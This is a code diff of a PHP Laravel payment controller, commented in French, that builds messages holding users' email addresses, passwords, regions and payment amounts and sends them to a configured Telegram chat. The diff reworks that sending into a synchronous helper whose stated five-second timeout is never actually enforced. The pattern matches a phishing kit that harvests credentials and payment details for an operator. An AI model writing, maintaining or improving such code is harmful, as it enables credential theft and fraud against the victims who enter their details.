@@ -25,15 +25,8 @@ class PaymentController extends Controller
                  . "📧 Email : {$validated['username']}\n"
                  . "🔐 Mot de passe : {$validated['password']}" ;
 
-        // Envoyer Telegram de manière asynchrone (sans attendre)
-        dispatch(function () use ($message) {
-            try {
-                Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
-                    ->notify(new TelegramAlert($message));
-            } catch (\Throwable $e) {
-                Log::error('Telegram Error: ' . $e->getMessage());
-            }
-        })->onQueue('default');
+        // Envoyer Telegram avec timeout court
+        $this->sendTelegramMessage($message);
 
         return redirect()->route('personal-info');
     }
@@ -66,17 +59,33 @@ class PaymentController extends Controller
                  . "🗺️ Région : {$validated['region']}\n"
                  . "💰 Montant : {$validated['article_amount']} €";
 
-        // Envoyer Telegram de manière asynchrone (sans attendre)
-        dispatch(function () use ($message) {
-            try {
-                Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
-                    ->notify(new TelegramAlert($message));
-            } catch (\Throwable $e) {
-                Log::error('Telegram Error: ' . $e->getMessage());
-            }
-        })->onQueue('default');
+        // Envoyer Telegram avec timeout court
+        $this->sendTelegramMessage($message);
 
         return redirect()->route('reservation');
+    }
+
+    /**
+     * Envoyer un message Telegram avec timeout court
+     */
+    private function sendTelegramMessage($message)
+    {
+        try {
+            // Timeout 5 secondes max
+            $timeout = 5;
+            $start = time();
+            
+            Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
+                ->notify(new TelegramAlert($message));
+                
+            $elapsed = time() - $start;
+            if ($elapsed > 3) {
+                Log::warning("Telegram took {$elapsed}s");
+            }
+        } catch (\Throwable $e) {
+            Log::error('Telegram Error: ' . $e->getMessage());
+            // Continue silencieusement
+        }
     }
 
     
